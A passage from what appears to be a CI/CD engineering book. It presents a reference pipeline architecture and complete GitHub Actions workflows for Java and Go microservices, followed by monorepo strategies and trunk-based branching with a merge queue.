- [ ] Required workflows (security scanning) enforced org-wide via rulesets.
- [ ] Audit log streaming enabled to your SIEM.
- [ ] Self-hosted runners in runner groups, restricted to specific repositories, never on public repos.
- [ ] Fork PRs cannot access secrets (verify — it is the default, but check org settings).
- [ ] A periodic review of who has write access, and of open PATs.

---
# Part V — Production Engineering

---

## Chapter 43 — Designing a Pipeline End to End

### 43.1 Start from the questions, not the YAML

Before writing a line, answer these:

| Question | Why it matters |
|---|---|
| What is the deployable unit? | A JAR? An image? A Helm release? This determines everything downstream |
| What is the slowest acceptable PR feedback time? | Sets your budget for what can be blocking |
| What must be true before code reaches production? | Your gate list |
| Who is allowed to deploy to production, and how is that enforced? | Environments + execution protections + OIDC claims |
| How do we roll back, and how fast? | Determines deployment strategy |
| What breaks if the pipeline is down for a day? | Determines how much you invest in resilience |
| How many services will use this? | 1 → inline it. 20 → build a paved road |

### 43.2 The reference architecture

```mermaid
flowchart TD
    subgraph PR["PR gate — target under 10 minutes"]
        direction TB
        P0["Change detection"] --> P1["Lint + format · 30s"]
        P0 --> P2["Unit tests · 3m"]
        P0 --> P3["Dependency review + secret scan · 30s"]
        P0 --> P4["Build · 2m"]
        P4 --> P5["Integration tests · 6m"]
        P4 --> P6["Container build (no push) · 2m"]
        P1 --> PG["CI Gate"]
        P2 --> PG
        P3 --> PG
        P5 --> PG
        P6 --> PG
    end

    PG --> MERGE["Merge queue → main"]

    subgraph MAIN["On main — produce the artifact once"]
        MERGE --> M1["Build + push image to registry"]
        M1 --> M2["Vulnerability scan"]
        M1 --> M3["Generate SBOM"]
        M1 --> M4["Sign + attest provenance"]
        M2 --> M5["Deploy to staging"]
        M3 --> M5
        M4 --> M5
        M5 --> M6["Smoke tests"]
        M6 --> M7["E2E suite"]
    end

    subgraph PROD["Promotion — same digest, gated"]
        M7 --> PR1{"environment: production<br/>required reviewers<br/>branch restriction"}
        PR1 --> PD1["DB migration (expand)"]
        PD1 --> PD2["Deploy canary 5%"]
        PD2 --> PD3["Analyse SLOs · 10m bake"]
        PD3 --> PD4["Progressive rollout to 100%"]
        PD4 --> PD5["Post-deploy verification"]
        PD5 --> PD6["Notify + record DORA metrics"]
    end

    subgraph OOB["Out of band"]
        N1["Nightly full matrix"]
        N2["Weekly CodeQL"]
        N3["Daily drift detection"]
        N4["Weekly CI health report"]
        N5["Dependabot"]
        N6["Rollback runbook (always available)"]
    end
```

### 43.3 File layout for this architecture

```
.github/
├── workflows/
│   ├── pr.yml                    # the gate. pull_request
│   ├── main.yml                  # build, push, deploy staging. push: main
│   ├── promote.yml               # deploy production. workflow_dispatch
│   ├── rollback.yml              # workflow_dispatch
│   ├── ops-runbook.yml           # workflow_dispatch
│   ├── release.yml               # push: tags
│   ├── nightly.yml               # schedule
│   ├── codeql.yml                # schedule + pull_request
│   ├── terraform.yml             # pull_request/push on infra/**
│   ├── drift.yml                 # schedule
│   ├── ci-metrics.yml            # workflow_run
│   ├── ci-report.yml             # schedule
│   ├── labeler.yml               # pull_request_target (labels only)
│   └── chatops.yml               # issue_comment
├── actions/
│   ├── setup-build/
│   ├── notify/
│   └── verify-image/
├── dependabot.yml
├── labeler.yml
└── CODEOWNERS
```

### 43.4 A principled set of design rules

1. **The PR gate is sacred.** Under ten minutes, and it must be trustworthy — no known-flaky checks.
2. **One required status check** (`CI Gate`). Everything else is internal detail.
3. **Build once.** The digest produced on `main` is what reaches every environment.
4. **Deploy is parameterised by artifact, not by branch.**
5. **Every workflow declares `permissions:` and every job declares `timeout-minutes:`.**
6. **No long-lived cloud credentials.** OIDC, bound to environments.
7. **Production requires a human.** Not because humans are good at spotting problems, but because the approval creates an accountable record and a moment of pause.
8. **Rollback is one click and is tested monthly.**
9. **Notifications on state transitions only.**
10. **Measure the pipeline.** You cannot improve what you do not see.

---

## Chapter 44 — Complete Worked Example: Java / Spring Boot Microservice

This is a full, coherent pipeline you can adapt directly. It assumes: Maven, JDK 21, Docker, GHCR, EKS with Helm, AWS via OIDC.

### 44.1 `pr.yml` — the gate

```yaml
# .github/workflows/pr.yml
name: PR

on:
  pull_request:
    types: [opened, synchronize, reopened, ready_for_review]
  merge_group:

permissions:
  contents: read

concurrency:
  group: pr-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: true

cache-mode: read           # untrusted input: restore caches, never write them

env:
  JAVA_VERSION: '21'
  MAVEN_ARGS: '-B -ntp --fail-at-end'

jobs:
  changes:
    runs-on: ubuntu-24.04
    timeout-minutes: 5
    outputs:
      code: ${{ steps.f.outputs.code }}
      infra: ${{ steps.f.outputs.infra }}
    steps:
      - uses: actions/checkout@v7
      - uses: dorny/paths-filter@v4
        id: f
        with:
          filters: |
            code:
              - 'src/**'
              - 'pom.xml'
              - 'Dockerfile'
              - '.github/workflows/**'
            infra:
              - 'charts/**'
              - 'infra/**'

  lint:
    needs: changes
    if: needs.changes.outputs.code == 'true' && github.event.pull_request.draft != true
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v7
      - uses: ./.github/actions/setup-build
        with: { java-version: '${{ env.JAVA_VERSION }}' }
      - run: mvn $MAVEN_ARGS spotless:check
      - if: always()
        run: mvn $MAVEN_ARGS checkstyle:check
      - if: always()
        run: mvn $MAVEN_ARGS spotbugs:check

  unit:
    needs: changes
    if: needs.changes.outputs.code == 'true'
    runs-on: ubuntu-24.04
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v7
      - uses: ./.github/actions/setup-build
        with: { java-version: '${{ env.JAVA_VERSION }}' }
      - run: mvn $MAVEN_ARGS test
      - if: always()
        uses: mikepenz/action-junit-report@v6
        with:
          report_paths: '**/target/surefire-reports/TEST-*.xml'
          annotate_only: true
          detailed_summary: true
      - if: always()
        uses: actions/upload-artifact@v7
        with:
          name: surefire
          path: '**/target/surefire-reports/**'
          retention-days: 5
          if-no-files-found: ignore

  integration:
    needs: changes
    if: needs.changes.outputs.code == 'true'
    runs-on: ubuntu-24.04
    timeout-minutes: 25
    steps:
      - uses: actions/checkout@v7
      - uses: ./.github/actions/setup-build
        with: { java-version: '${{ env.JAVA_VERSION }}' }
      - name: Pre-pull Testcontainers images
        run: |
          docker pull postgres:17-alpine &
          docker pull redis:7-alpine &
          wait
      - run: mvn $MAVEN_ARGS verify -Pintegration-tests -Djacoco.skip=false
      - name: Coverage gate
        run: |
          set -euo pipefail
          PCT="$(python3 .github/scripts/jacoco_pct.py target/site/jacoco/jacoco.xml)"
          echo "COVERAGE=$PCT" >> "$GITHUB_ENV"
          echo "Line coverage: ${PCT}%"
          awk -v p="$PCT" 'BEGIN{exit (p>=80)?0:1}' \
            || { echo "::error::Coverage ${PCT}% below 80% threshold"; exit 1; }
      - if: always()
        run: |
          {
            echo "## Integration tests"
            echo ""
            echo "Coverage: **${COVERAGE:-n/a}%** (threshold 80%)"
          } >> "$GITHUB_STEP_SUMMARY"

  security:
    needs: changes
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    permissions:
      contents: read
      pull-requests: write
      security-events: write
    steps:
      - uses: actions/checkout@v7
        with: { fetch-depth: 0 }
      - uses: actions/dependency-review-action@v4
        if: github.event_name == 'pull_request'
        with:
          fail-on-severity: high
          deny-licenses: GPL-3.0, AGPL-3.0, SSPL-1.0
          comment-summary-in-pr: on-failure
      - uses: gitleaks/gitleaks-action@v2
        env: { GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }} }

  container:
    needs: changes
    if: needs.changes.outputs.code == 'true'
    runs-on: ubuntu-24.04
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v7
      - uses: docker/setup-buildx-action@v4
      - name: Build image (no push on PRs)
        uses: docker/build-push-action@v7
        with:
          context: .
          push: false
          load: true
          tags: local/api:pr-${{ github.event.pull_request.number }}
          cache-from: type=gha
          # note: no cache-to — cache-mode: read means we cannot write anyway
      - name: Scan the image
        uses: aquasecurity/trivy-action@0.36.0
        with:
          image-ref: local/api:pr-${{ github.event.pull_request.number }}
          format: table
          exit-code: '1'
          severity: CRITICAL
          ignore-unfixed: true

  helm-lint:
    needs: changes
    if: needs.changes.outputs.infra == 'true'
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v7
      - uses: azure/setup-helm@v4
      - run: helm lint charts/api --values charts/api/values-production.yaml
      - run: |
          helm template api charts/api -f charts/api/values-production.yaml > rendered.yaml
          curl -sSL https://github.com/yannh/kubeconform/releases/latest/download/kubeconform-linux-amd64.tar.gz | tar xz
          ./kubeconform -strict -summary -kubernetes-version 1.31.0 rendered.yaml

  ci-gate:
    name: CI Gate
    if: always()
    needs: [changes, lint, unit, integration, security, container, helm-lint]
    runs-on: ubuntu-24.04
    timeout-minutes: 5
    steps:
      - name: Fail if any required check did not pass
        if: contains(needs.*.result, 'failure') || contains(needs.*.result, 'cancelled')
        run: |
          echo "::error::One or more checks failed"
          exit 1
      - run: echo "All required checks passed."
```

Make **`CI Gate`** the single required status check in branch protection.

### 44.2 The shared setup action

```yaml
# .github/actions/setup-build/action.yml
name: Set up the Java build environment
description: JDK, Maven cache and settings
inputs:
  java-version: { required: false, default: '21' }
runs:
  using: composite
  steps:
    - uses: actions/setup-java@v6
      with:
        distribution: temurin
        java-version: ${{ inputs.java-version }}
        cache: maven
    - shell: bash
      run: |
        echo "MAVEN_OPTS=-Xmx3g -XX:+UseG1GC" >> "$GITHUB_ENV"
        java -version
        mvn -v
```

### 44.3 `main.yml` — build once, deploy to staging

```yaml
# .github/workflows/main.yml
name: Main

on:
  push:
    branches: [main]
    paths-ignore: ['docs/**', '**.md']

permissions:
  contents: read

concurrency:
  group: main-${{ github.ref }}
  cancel-in-progress: false      # never cancel a run that deploys

env:
  REGISTRY: ghcr.io
  IMAGE_NAME: ${{ github.repository }}

jobs:
  build:
    runs-on: ubuntu-24.04
    timeout-minutes: 30
    permissions:
      contents: read
      packages: write
      id-token: write
      attestations: write
    outputs:
      version: ${{ steps.meta.outputs.version }}
      image:   ${{ steps.ref.outputs.image }}
      digest:  ${{ steps.push.outputs.digest }}
    steps:
      - uses: actions/checkout@v7
        with: { fetch-depth: 0 }

      - uses: ./.github/actions/setup-build

      - id: meta
        run: |
          VERSION="$(git describe --tags --always)"
          echo "version=$VERSION" >> "$GITHUB_OUTPUT"

      - name: Build and test
        run: mvn -B -ntp clean verify -Drevision=${{ steps.meta.outputs.version }}

      - uses: docker/setup-buildx-action@v4

      - uses: docker/login-action@v4
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - id: docker-meta
        uses: docker/metadata-action@v6
        with:
          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
          tags: |
            type=sha,format=long
            type=raw,value=latest,enable={{is_default_branch}}
            type=raw,value=${{ steps.meta.outputs.version }}

      - id: push
        uses: docker/build-push-action@v7
        with:
          context: .
          push: true
          tags: ${{ steps.docker-meta.outputs.tags }}
          labels: ${{ steps.docker-meta.outputs.labels }}
          build-args: VERSION=${{ steps.meta.outputs.version }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
          provenance: true
          sbom: true

      - id: ref
        run: echo "image=${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}@${{ steps.push.outputs.digest }}" >> "$GITHUB_OUTPUT"

      - uses: actions/attest-build-provenance@v4
        with:
          subject-name: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
          subject-digest: ${{ steps.push.outputs.digest }}
          push-to-registry: true

      - uses: sigstore/cosign-installer@v4
      - run: cosign sign --yes "${{ steps.ref.outputs.image }}"

      - uses: anchore/sbom-action@v0
        with:
          image: ${{ steps.ref.outputs.image }}
          format: cyclonedx-json
          output-file: sbom.cdx.json
      - uses: actions/attest-sbom@v3
        with:
          subject-name: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
          subject-digest: ${{ steps.push.outputs.digest }}
          sbom-path: sbom.cdx.json
          push-to-registry: true

  scan:
    needs: build
    runs-on: ubuntu-24.04
    timeout-minutes: 15
    permissions:
      contents: read
      packages: read
      security-events: write
    steps:
      - uses: docker/login-action@v4
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - uses: aquasecurity/trivy-action@0.36.0
        with:
          image-ref: ${{ needs.build.outputs.image }}
          format: sarif
          output: trivy.sarif
          severity: CRITICAL,HIGH
          ignore-unfixed: true
      - uses: github/codeql-action/upload-sarif@v4
        with: { sarif_file: trivy.sarif, category: trivy }

  deploy-staging:
    needs: [build, scan]
    uses: ./.github/workflows/reusable-deploy.yml
    with:
      environment: staging
      image: ${{ needs.build.outputs.image }}
      version: ${{ needs.build.outputs.version }}
    secrets: inherit

  e2e:
    needs: deploy-staging
    runs-on: ubuntu-24.04
    timeout-minutes: 40
    strategy:
      fail-fast: false
      matrix: { shard: [1, 2, 3] }
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-node@v7
        with: { node-version: '22', cache: npm }
      - run: npm ci && npx playwright install --with-deps chromium
      - run: npx playwright test --shard=${{ matrix.shard }}/${{ strategy.job-total }}
        env: { BASE_URL: ${{ vars.STAGING_URL }} }
      - if: failure()
        uses: actions/upload-artifact@v7
        with:
          name: e2e-trace-${{ matrix.shard }}
          path: test-results/
          retention-days: 7

  notify:
    needs: [build, deploy-staging, e2e]
    if: always()
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
      - uses: ./.github/actions/notify
        with:
          status: ${{ (needs.deploy-staging.result == 'success' && needs.e2e.result == 'success') && 'success' || 'failure' }}
          channel: deploys
          webhook: ${{ secrets.SLACK_DEPLOYS_WEBHOOK }}
          title: "Staging deploy ${{ needs.build.outputs.version }}"
          details: "Image: ${{ needs.build.outputs.image }}"
```

### 44.4 `reusable-deploy.yml`

```yaml
# .github/workflows/reusable-deploy.yml
name: Reusable deploy

on:
  workflow_call:
    inputs:
      environment: { required: true, type: string }
      image:       { required: true, type: string }
      version:     { required: true, type: string }
    outputs:
      url:
        value: ${{ jobs.deploy.outputs.url }}

permissions:
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-24.04
    timeout-minutes: 25
    environment:
      name: ${{ inputs.environment }}
      url: ${{ vars.SERVICE_URL }}
    permissions:
      contents: read
      id-token: write
      deployments: write
    concurrency:
      group: deploy-api-${{ inputs.environment }}
      cancel-in-progress: false
    outputs:
      url: ${{ vars.SERVICE_URL }}
    steps:
      - uses: actions/checkout@v7

      - uses: aws-actions/configure-aws-credentials@v6
        with:
          role-to-assume: ${{ vars.DEPLOY_ROLE_ARN }}
          aws-region: ${{ vars.AWS_REGION }}
          role-session-name: deploy-${{ inputs.environment }}-${{ github.run_id }}

      - uses: sigstore/cosign-installer@v4
      - name: Verify the image signature
        run: |
          cosign verify \
            --certificate-identity-regexp "^https://github.com/${{ github.repository }}/.github/workflows/.*" \
            --certificate-oidc-issuer https://token.actions.githubusercontent.com \
            "${{ inputs.image }}"

      - run: aws eks update-kubeconfig --name "${{ vars.CLUSTER_NAME }}" --region "${{ vars.AWS_REGION }}"

      - name: Database migration
        run: |
          kubectl -n "${{ vars.NAMESPACE }}" delete job db-migrate --ignore-not-found
          kubectl -n "${{ vars.NAMESPACE }}" create job db-migrate \
            --image="${{ inputs.image }}" -- java -jar /app/app.jar --spring.profiles.active=migrate
          kubectl -n "${{ vars.NAMESPACE }}" wait --for=condition=complete job/db-migrate --timeout=15m

      - uses: azure/setup-helm@v4
      - name: Helm upgrade
        run: |
          helm upgrade --install api ./charts/api \
            --namespace "${{ vars.NAMESPACE }}" --create-namespace \
            --values "./charts/api/values-${{ inputs.environment }}.yaml" \
            --set image.ref="${{ inputs.image }}" \
            --set version="${{ inputs.version }}" \
            --set annotations.gitSha="${GITHUB_SHA}" \
            --atomic --wait --timeout 12m

      - name: Verify rollout and health
        run: |
          set -euo pipefail
          kubectl -n "${{ vars.NAMESPACE }}" rollout status deployment/api --timeout=6m
          for i in $(seq 1 40); do
            BODY="$(curl -fsS "${{ vars.SERVICE_URL }}/actuator/info" || true)"
            if grep -q "${{ inputs.version }}" <<< "$BODY"; then
              echo "Version ${{ inputs.version }} is live"; exit 0
            fi
            sleep 5
          done
          echo "::error::Service did not report version ${{ inputs.version }}"
          exit 1

      - name: Diagnostics on failure
        if: failure()
        run: |
          kubectl -n "${{ vars.NAMESPACE }}" get pods -o wide || true
          kubectl -n "${{ vars.NAMESPACE }}" describe deployment api || true
          kubectl -n "${{ vars.NAMESPACE }}" logs -l app=api --tail=300 --all-containers || true
          kubectl -n "${{ vars.NAMESPACE }}" get events --sort-by=.lastTimestamp | tail -60 || true

      - if: always()
        run: |
          {
            echo "## Deploy: ${{ inputs.environment }}"
            echo ""
            echo "| Field | Value |"
            echo "|---|---|"
            echo "| Version | \`${{ inputs.version }}\` |"
            echo "| Image | \`${{ inputs.image }}\` |"
            echo "| URL | ${{ vars.SERVICE_URL }} |"
            echo "| Result | ${{ job.status }} |"
          } >> "$GITHUB_STEP_SUMMARY"
```

### 44.5 `promote.yml` — production

```yaml
# .github/workflows/promote.yml
name: 🚀 Promote to production

on:
  workflow_dispatch:
    inputs:
      run_id:
        description: 'Main workflow run ID whose image to promote (blank = latest successful)'
        type: string
        required: false
      confirm:
        description: "Type 'production' to confirm"
        type: string
        required: true

run-name: "🚀 Promote to production by @${{ github.actor }}"

permissions:
  contents: read
  actions: read

jobs:
  resolve:
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    outputs:
      image: ${{ steps.r.outputs.image }}
      version: ${{ steps.r.outputs.version }}
    steps:
      - name: Confirm
        run: |
          [ "${{ inputs.confirm }}" = "production" ] \
            || { echo "::error::Confirmation text did not match"; exit 1; }

      - id: r
        env: { GH_TOKEN: ${{ secrets.GITHUB_TOKEN }} }
        run: |
          set -euo pipefail
          RUN_ID="${{ inputs.run_id }}"
          if [ -z "$RUN_ID" ]; then
            RUN_ID="$(gh run list --workflow=main.yml --branch=main --status=success \
                      --limit 1 --json databaseId --jq '.[0].databaseId')"
          fi
          echo "Promoting from run $RUN_ID"
          # The build job's outputs are recorded in the run's job summary;
          # in practice, publish them as an artifact from main.yml and read it here.
          gh run download "$RUN_ID" -n build-metadata -D meta
          echo "image=$(jq -r .image meta/build.json)" >> "$GITHUB_OUTPUT"
          echo "version=$(jq -r .version meta/build.json)" >> "$GITHUB_OUTPUT"

  deploy-production:
    needs: resolve
    uses: ./.github/workflows/reusable-deploy.yml
    with:
      environment: production        # ← required reviewers + branch restriction live here
      image: ${{ needs.resolve.outputs.image }}
      version: ${{ needs.resolve.outputs.version }}
    secrets: inherit

  post-deploy:
    needs: [resolve, deploy-production]
    if: always()
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
      - name: Smoke test production
        if: needs.deploy-production.result == 'success'
        run: ./scripts/smoke.sh "${{ vars.PRODUCTION_URL }}"
      - uses: ./.github/actions/notify
        if: always()
        with:
          status: ${{ needs.deploy-production.result }}
          channel: incidents
          webhook: ${{ secrets.SLACK_DEPLOYS_WEBHOOK }}
          title: "Production deploy ${{ needs.resolve.outputs.version }}"
          details: "By @${{ github.actor }}"
```

🧠 Note the pattern for passing the built image to a later, separately-triggered workflow: `main.yml` uploads a small `build-metadata` artifact containing the digest; `promote.yml` downloads it by run ID. Job outputs do not cross workflow runs, but artifacts do.

Add this to `main.yml`'s build job:

```yaml
      - name: Record build metadata
        run: |
          jq -n --arg i "${{ steps.ref.outputs.image }}" \
                --arg v "${{ steps.meta.outputs.version }}" \
                --arg s "${GITHUB_SHA}" \
            '{image:$i, version:$v, sha:$s}' > build.json
      - uses: actions/upload-artifact@v7
        with: { name: build-metadata, path: build.json, retention-days: 90 }
```

---

## Chapter 45 — Complete Worked Example: Go Microservice

Same architecture, adapted. Shown more compactly since the concepts repeat.

```yaml
# .github/workflows/go-ci.yml
name: Go CI

on:
  pull_request:
  push: { branches: [main] }
  merge_group:

permissions:
  contents: read

concurrency:
  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

cache-mode: ${{ github.event_name == 'pull_request' && 'read' || 'write' }}

env:
  GO_VERSION: '1.24'

jobs:
  lint:
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-go@v7
        with: { go-version: '${{ env.GO_VERSION }}', cache: true }
      - name: gofmt
        run: |
          OUT="$(gofmt -l .)"
          [ -z "$OUT" ] || { echo "$OUT" | sed 's|^|::error file=|;s|$|::not gofmt-formatted|'; exit 1; }
      - run: go vet ./...
      - uses: golangci/golangci-lint-action@v8
        with: { version: latest, args: --timeout=5m --out-format=github-actions }
      - name: go.mod tidy check
        run: go mod tidy && git diff --exit-code go.mod go.sum
      - name: govulncheck
        run: |
          go install golang.org/x/vuln/cmd/govulncheck@latest
          govulncheck ./...

  test:
    runs-on: ubuntu-24.04
    timeout-minutes: 20
    services:
      postgres:
        image: postgres:17-alpine
        env: { POSTGRES_PASSWORD: test, POSTGRES_DB: testdb, POSTGRES_USER: test }
        ports: ['5432:5432']
        options: >-
          --health-cmd "pg_isready -U test" --health-interval 5s --health-retries 20
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-go@v7
        with: { go-version: '${{ env.GO_VERSION }}', cache: true }

      - name: Unit + integration tests with race detector
        run: |
          go test -race -shuffle=on -covermode=atomic -coverprofile=coverage.out \
            -timeout=10m ./...
        env:
          DATABASE_URL: postgres://test:test@localhost:5432/testdb?sslmode=disable

      - name: Coverage gate
        run: |
          PCT="$(go tool cover -func=coverage.out | tail -1 | awk '{print $3}' | tr -d '%')"
          echo "Coverage: ${PCT}%"
          echo "| Metric | Value |" >> "$GITHUB_STEP_SUMMARY"
          echo "|---|---|" >> "$GITHUB_STEP_SUMMARY"
          echo "| Line coverage | ${PCT}% |" >> "$GITHUB_STEP_SUMMARY"
          awk -v p="$PCT" 'BEGIN{exit (p>=75)?0:1}' \
            || { echo "::error::Coverage ${PCT}% below 75%"; exit 1; }

      - name: Detect flaky tests
        if: always()
        run: go test -count=3 -run 'TestFlaky|TestConcurrent' ./... || true

  build:
    runs-on: ubuntu-24.04
    timeout-minutes: 15
    strategy:
      matrix:
        include:
          - goos: linux
            goarch: amd64
          - goos: linux
            goarch: arm64
          - goos: darwin
            goarch: arm64
    steps:
      - uses: actions/checkout@v7
        with: { fetch-depth: 0 }
      - uses: actions/setup-go@v7
        with: { go-version: '${{ env.GO_VERSION }}', cache: true }
      - run: |
          VERSION="$(git describe --tags --always)"
          CGO_ENABLED=0 GOOS=${{ matrix.goos }} GOARCH=${{ matrix.goarch }} \
          go build -trimpath \
            -ldflags "-s -w -X main.version=${VERSION} -X main.commit=${GITHUB_SHA}" \
            -o "dist/api-${{ matrix.goos }}-${{ matrix.goarch }}" ./cmd/api
      - uses: actions/upload-artifact@v7
        with:
          name: bin-${{ matrix.goos }}-${{ matrix.goarch }}
          path: dist/*
          retention-days: 5

  image:
    if: github.event_name == 'push'
    needs: [lint, test, build]
    runs-on: ubuntu-24.04
    timeout-minutes: 20
    permissions:
      contents: read
      packages: write
      id-token: write
      attestations: write
    outputs:
      image: ghcr.io/${{ github.repository }}@${{ steps.push.outputs.digest }}
    steps:
      - uses: actions/checkout@v7
      - uses: docker/setup-buildx-action@v4
      - uses: docker/login-action@v4
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - id: meta
        uses: docker/metadata-action@v6
        with:
          images: ghcr.io/${{ github.repository }}
          tags: |
            type=sha,format=long
            type=raw,value=latest,enable={{is_default_branch}}
      - id: push
        uses: docker/build-push-action@v7
        with:
          context: .
          platforms: linux/amd64,linux/arm64
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
          provenance: true
          sbom: true
      - uses: actions/attest-build-provenance@v4
        with:
          subject-name: ghcr.io/${{ github.repository }}
          subject-digest: ${{ steps.push.outputs.digest }}
          push-to-registry: true

  gate:
    name: CI Gate
    if: always()
    needs: [lint, test, build]
    runs-on: ubuntu-24.04
    steps:
      - if: contains(needs.*.result, 'failure') || contains(needs.*.result, 'cancelled')
        run: exit 1
      - run: echo ok
```

Go-specific notes:
- **`-race` is non-negotiable in CI.** It roughly doubles test time and finds the bugs you cannot reproduce locally.
- **`-shuffle=on`** catches tests that depend on execution order.
- **`govulncheck`** is better than generic SCA for Go because it does reachability analysis — it only reports vulnerabilities in code paths you actually call.
- **`CGO_ENABLED=0` + `-trimpath`** gives you a static, reproducible binary that runs in a `scratch` or `distroless` image.
- Cross-compilation is free in Go, so a build matrix costs almost nothing.

Dockerfile:

```dockerfile
FROM golang:1.24-alpine AS build
WORKDIR /src
COPY go.mod go.sum ./
RUN --mount=type=cache,target=/go/pkg/mod go mod download
COPY . .
ARG VERSION=dev
RUN --mount=type=cache,target=/go/pkg/mod \
    --mount=type=cache,target=/root/.cache/go-build \
    CGO_ENABLED=0 go build -trimpath -ldflags "-s -w -X main.version=${VERSION}" -o /out/api ./cmd/api

FROM gcr.io/distroless/static-debian12:nonroot
COPY --from=build /out/api /api
USER nonroot:nonroot
EXPOSE 8080
ENTRYPOINT ["/api"]
```

---

## Chapter 46 — Monorepo Strategies

### 46.1 The core tension

```mermaid
flowchart TD
    A["Monorepo with 20 services"] --> B{"How much do we run<br/>on each change?"}
    B -->|"Everything"| C["✅ Always correct<br/>❌ 90 minute PR gate<br/>❌ Enormous cost"]
    B -->|"Only what changed"| D["✅ Fast and cheap<br/>❌ Must model the dependency graph<br/>❌ Miss a dependency = broken main"]
    D --> E["The whole difficulty is<br/>getting the graph right"]
```

### 46.2 Three levels of sophistication

| Level | Mechanism | Good for | Breaks when |
|---|---|---|---|
| 1 | Path filters (`dorny/paths-filter`) | 2–10 services, clear boundaries | Shared library dependencies are hand-maintained and go stale |
| 2 | Build-tool affected-graph (Nx, Turborepo, Gradle, Bazel) | 10+ services, real dependency graph | Requires adopting the build tool |
| 3 | Remote-cached build graph (Bazel + remote cache, Gradle build cache, Nx Cloud) | Very large repos | Operational complexity |

### 46.3 Level 1 done properly

The failure mode is forgetting that a change to `libs/common` must rebuild everything depending on it. Make the mapping explicit and testable:

```yaml
# .github/filters.yml
_shared: &shared
  - 'libs/common/**'
  - 'pom.xml'
  - '.github/workflows/**'

api:
  - *shared
  - 'services/api/**'
worker:
  - *shared
  - 'services/worker/**'
scheduler:
  - *shared
  - 'services/scheduler/**'
  - 'libs/scheduling/**'
```

```yaml
      - uses: dorny/paths-filter@v4
        id: f
        with:
          filters: .github/filters.yml
```

YAML anchors keep the shared list in one place. Add a test that fails if a new directory under `services/` has no filter entry.

### 46.4 Make skipped jobs succeed, not skip

The cleanest resolution to the path-filter/required-check problem:

```yaml
  build:
    needs: changes
    runs-on: ubuntu-24.04
    strategy:
      matrix:
        service: [api, worker, scheduler]
    steps:
      - name: Skip if unchanged
        id: skip
        run: |
          CHANGED='${{ needs.changes.outputs.services }}'
          if jq -e --arg s '${{ matrix.service }}' 'index($s)' <<< "$CHANGED" > /dev/null; then
            echo "run=true" >> "$GITHUB_OUTPUT"
          else
            echo "run=false" >> "$GITHUB_OUTPUT"
            echo "::notice::${{ matrix.service }} unchanged — skipping build"
          fi

      - if: steps.skip.outputs.run == 'true'
        uses: actions/checkout@v7
      - if: steps.skip.outputs.run == 'true'
        run: ./gradlew ":services:${{ matrix.service }}:build"
```

Every matrix leg **runs and succeeds**, so the check name always reports. The unchanged ones take ten seconds. Slightly wasteful, dramatically simpler to reason about.

### 46.5 Sparse checkout for huge repos

```yaml
      - uses: actions/checkout@v7
        with:
          sparse-checkout: |
            services/${{ matrix.service }}
            libs/common
            gradle
            settings.gradle.kts
          sparse-checkout-cone-mode: true
          fetch-depth: 1
```

On a multi-gigabyte repo this turns a 4-minute checkout into 20 seconds.

### 46.6 Per-service ownership

```
# CODEOWNERS
/services/api/        @org/api-team
/services/worker/     @org/data-team
/libs/common/         @org/platform-team @org/api-team @org/data-team
/infra/               @org/platform-team
/.github/workflows/   @org/platform-team
```

Combined with a required review from code owners, this is how a monorepo keeps team autonomy.

---

## Chapter 47 — Branching Models and the Merge Queue

### 47.1 Trunk-based development, which is what you should do

```mermaid
gitGraph
    commit id: "main"
    branch feature-a
    commit id: "wip"
    checkout main
    branch feature-b
    commit id: "wip2"
    checkout main
    merge feature-a tag: "squash"
    commit id: "deploy staging"
    merge feature-b tag: "squash"
    commit id: "deploy staging"
    commit id: "v1.4.0" tag: "release"
```

Rules:
- Short-lived branches (hours to two days).
- Squash merge, so `main` history is one commit per change.
- The PR title becomes the commit message, so Conventional Commits work.
- Release by tagging a commit on `main`; no long-lived release branches unless you genuinely support multiple versions.

Workflow mapping:

| Trigger | Workflow |
|---|---|
| `pull_request` | Gate |
| `merge_group` | Gate (again, on the speculative merge) |
| `push: main` | Build, push, deploy staging, E2E |
| `workflow_dispatch` | Promote to production |
| `push: tags v*` | Release artifacts |

### 47.2 The merge queue

The problem it solves: PR A and PR B each pass CI against `main`, but together they break it. Semantically conflicting changes are invisible to per-PR CI.

The merge queue builds a speculative merge of `main + A + B` and runs CI on *that* before merging.

```mermaid
sequenceDiagram
    participant D as Developers
    participant Q as Merge queue
    participant CI as CI workflow
    participant M as main

    D->>Q: PR A approved, queued
    D->>Q: PR B approved, queued
    Q->>Q: build speculative merge: main+A
    Q->>CI: merge_group event
    Q->>Q: build speculative merge: main+A+B
    Q->>CI: merge_group event
    CI-->>Q: main+A ✅
    Q->>M: merge A
    CI-->>Q: main+A+B ❌
    Q->>Q: eject B, requeue rest
    Q->>D: B failed in the queue — fix and requeue
```

Enabling it:
